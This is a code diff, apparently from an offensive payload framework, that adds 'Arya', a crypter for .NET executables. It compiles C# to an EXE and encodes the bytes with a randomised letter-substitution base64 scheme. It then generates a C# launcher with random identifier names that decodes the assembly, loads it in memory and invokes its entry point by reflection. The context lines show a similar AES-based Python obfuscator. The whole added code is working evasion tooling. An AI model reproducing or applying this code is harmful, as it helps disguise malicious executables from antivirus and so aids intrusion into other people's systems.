@@ -12,6 +12,7 @@ from Crypto.Cipher import AES
 from Crypto.Cipher import ARC4
 
 from modules.common import helpers
+from modules.common import supportfiles
 
 # AES Block Size and Padding
 BlockSize = 32
@@ -199,3 +200,73 @@ def pyherion(code):
     crypted += "exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted)))
 
     return crypted
+
+
+def buildAryaLauncher(raw):
+    """
+    Takes a raw set of bytes and builds a launcher shell to b64decode/decrypt
+    a string rep of the bytes, and then use reflection to invoke 
+    the original .exe
+    
+    """
+
+    # the 'key' is a randomized alpha lookup table [a-zA-Z] used for substitution
+    key = ''.join(sorted(list(string.ascii_letters), key=lambda *args: random.random()))
+    base64payload = b64sub(raw,key)
+
+    payloadCode = "using System; using System.Collections.Generic; using System.Text;"
+    payloadCode += "using System.IO; using System.Reflection; using System.Linq;\n"
+
+    decodeFuncName = helpers.randomString()
+    baseStringName = helpers.randomString()
+    targetStringName = helpers.randomString()
+    dictionaryName = helpers.randomString()
+
+    # build out the letter sub decrypt function
+    payloadCode += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (helpers.randomString(), helpers.randomString(), decodeFuncName)
+    payloadCode += "string %s = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n" %(baseStringName)
+    payloadCode += "string %s = \"\"; Dictionary<char, char> %s = new Dictionary<char, char>();\n" %(targetStringName,dictionaryName)
+    payloadCode += "for (int i = 0; i < %s.Length; ++i){ %s.Add(k[i], %s[i]); }\n" %(baseStringName,dictionaryName,baseStringName)
+    payloadCode += "for (int i = 0; i < t.Length; ++i){ if ((t[i] >= 'A' && t[i] <= 'Z') || (t[i] >= 'a' && t[i] <= 'z')) { %s += %s[t[i]];}\n" %(targetStringName, dictionaryName)
+    payloadCode += "else { %s += t[i]; }} return %s; }\n" %(targetStringName,targetStringName)
+
+    encodedDataName = helpers.randomString()
+    base64PayloadName = helpers.randomString()
+    assemblyName = helpers.randomString()
+
+    # build out Main()
+    assemblyName = helpers.randomString()
+    methodInfoName = helpers.randomString()
+    keyName = helpers.randomString()
+    payloadCode += "static void Main() {\n"
+    payloadCode += "string %s = \"%s\";\n" % (base64PayloadName, base64payload)
+    payloadCode += "string %s = \"%s\";\n" %(keyName, key)
+    # load up the assembly of the decoded binary
+    payloadCode += "Assembly %s = Assembly.Load(Convert.FromBase64String(%s(%s, %s)));\n" %(assemblyName, decodeFuncName, base64PayloadName, keyName)
+    payloadCode += "MethodInfo %s = %s.EntryPoint;\n" %(methodInfoName, assemblyName)
+    # use reflection to jump to its entry point
+    payloadCode += "%s.Invoke(%s.CreateInstance(%s.Name), null);\n" %(methodInfoName, assemblyName, methodInfoName)
+    payloadCode += "}}}\n"
+
+    return payloadCode
+
+
+def arya(source):
+
+    # compile the source to a temporary .EXE path
+    tempExePath = supportfiles.compileToTemp("cs", source)
+
+    try:
+        # read in the raw binary
+        f = open(tempExePath, 'rb')
+        rawBytes = f.read()
+        f.close()
+
+        # build the obfuscated launcher source and return it
+        launcherCode = buildAryaLauncher(rawBytes)
+
+        return launcherCode
+
+    except:
+        print helpers.color(" [!] Couldn't read compiled .NET source file: %s"%(tempExePath), warning=True)
+        return ""
